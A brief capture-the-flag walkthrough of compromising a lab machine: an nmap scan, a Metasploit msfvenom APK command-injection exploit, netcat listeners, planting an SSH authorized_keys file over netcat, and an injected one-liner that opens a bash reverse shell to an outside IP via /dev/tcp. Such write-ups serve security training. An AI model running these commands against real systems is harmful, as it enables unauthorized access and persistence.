First we ran an nmap scan on the system:
```
nmap -sV -sC -T4 10.10.10.226
```
we found an open port 5000 and then browsed to the endpoint and found a website that allowed us to upload files.
using search sploit found out that msfconsole could be used to generate a payload that could exploit the machine

commands
```
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
set lhost <attacker ip>
set lport 4444
exploit
```
the exploit did not work with the python reverse shell so we switched to a netcat reverse  shell and it generated an apk file.
We then uploaded the file to the website and opened up a netcat listener ```nc -nlvp 4444```

We successfully gained user access to the machine and then cd'd into the .ssh folder and downloaded an authorized_keys file generated with ```ssh-keygen -f rsa``` and sent it with netcat ```nc -w 3 <victim ip> 1234 < authorized_keys``` recieved it with ```nc -nlvp 1234 > authorized_keys```.

after sshing in I gained access to the pwn folder and found a script called "scanlosers.sh" that called to a file called "~/logs/hacker".

we created a one liner reverse shell to connect to user pwn successfully.

```
echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1' #" >> hackers
```

